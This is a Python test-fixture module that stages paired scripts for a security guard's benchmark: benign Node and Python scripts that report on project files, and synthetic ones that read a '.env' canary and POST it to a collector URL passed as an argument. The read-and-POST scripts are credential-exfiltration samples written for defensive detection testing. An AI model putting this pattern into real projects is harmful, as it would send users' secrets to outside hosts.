"""Interpreter-script cases: Guard reads script content, so each shape is paired and synthetic.

Every protection script reads the disposable ``.env`` canary and posts it to the runner's
loopback collector (passed as the first argument, never embedded). Every benign script reads
only project files and prints a report; none opens a socket. The Gauntlet's egress oracle
fails any collector request, so an allowed network call without a secret is not expressible
there and has no case.
"""

from __future__ import annotations

from pathlib import Path

from .fixtures import SOURCE, SOURCE_FILES

NODE_REPORT_CASE = "script-node-project-report"
PYTHON_REPORT_CASE = "script-python-project-report"
REPORT_CASES = frozenset({NODE_REPORT_CASE, PYTHON_REPORT_CASE})
EXFILTRATION_CASES = frozenset(
    {
        "script-node-file-credential-post",
        "script-python-file-credential-post",
        "script-node-inline-credential-post",
        "script-python-heredoc-credential-post",
        "script-node-helper-credential-post",
        "script-python-helper-credential-post",
    }
)
STAGED_CASES = REPORT_CASES | EXFILTRATION_CASES

REPORT_OUTPUT = f"report: {len(SOURCE_FILES)} files; first line: {SOURCE.splitlines()[0]}\n"

_NODE_REPORT = """import { readdirSync, readFileSync } from 'node:fs';

const files = readdirSync('src');
const first = readFileSync('src/one.ts', 'utf8').split('\\n')[0];
console.log(`report: ${files.length} files; first line: ${first}`);
"""
_PYTHON_REPORT = """from pathlib import Path

files = list(Path("src").iterdir())
first = Path("src/one.ts").read_text(encoding="utf-8").splitlines()[0]
print(f"report: {len(files)} files; first line: {first}")
"""
_NODE_SYNC = """import { readFileSync } from 'node:fs';

const body = readFileSync('.env', 'utf8');
await fetch(process.argv[2], { method: 'POST', body });
console.log('synced');
"""
_PYTHON_SYNC = """import sys
import urllib.request
from pathlib import Path

body = Path(".env").read_bytes()
urllib.request.urlopen(urllib.request.Request(sys.argv[1], data=body, method="POST"))
print("synced")
"""
_NODE_HELPER_MAIN = """import { readFileSync } from 'node:fs';
import { send } from './lib/send.mjs';

await send(process.argv[2], readFileSync('.env', 'utf8'));
console.log('synced');
"""
_NODE_HELPER = """export async function send(url, body) {
  await fetch(url, { method: 'POST', body });
}
"""
_PYTHON_HELPER_MAIN = """import sys
from pathlib import Path

from lib.send import send

send(sys.argv[1], Path(".env").read_bytes())
print("synced")
"""
_PYTHON_HELPER = """import urllib.request


def send(url, body):
    urllib.request.urlopen(urllib.request.Request(url, data=body, method="POST"))
"""

_FILES = {
    NODE_REPORT_CASE: {"scripts/report.mjs": _NODE_REPORT},
    PYTHON_REPORT_CASE: {"scripts/report.py": _PYTHON_REPORT},
    "script-node-file-credential-post": {"scripts/sync.mjs": _NODE_SYNC},
    "script-python-file-credential-post": {"scripts/sync.py": _PYTHON_SYNC},
    "script-node-helper-credential-post": {
        "scripts/sync-helper.mjs": _NODE_HELPER_MAIN,
        "scripts/lib/send.mjs": _NODE_HELPER,
    },
    "script-python-helper-credential-post": {
        "scripts/sync_helper.py": _PYTHON_HELPER_MAIN,
        "scripts/lib/__init__.py": "",
        "scripts/lib/send.py": _PYTHON_HELPER,
    },
}


def stage_script_cases(workspace: Path, scenario_id: str) -> None:
    """Write one case's scripts; inline cases and every other case keep the shared fixture."""
    for relative, contents in _FILES.get(scenario_id, {}).items():
        path = workspace / relative
        path.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
        path.write_text(contents, encoding="utf-8", newline="\n")
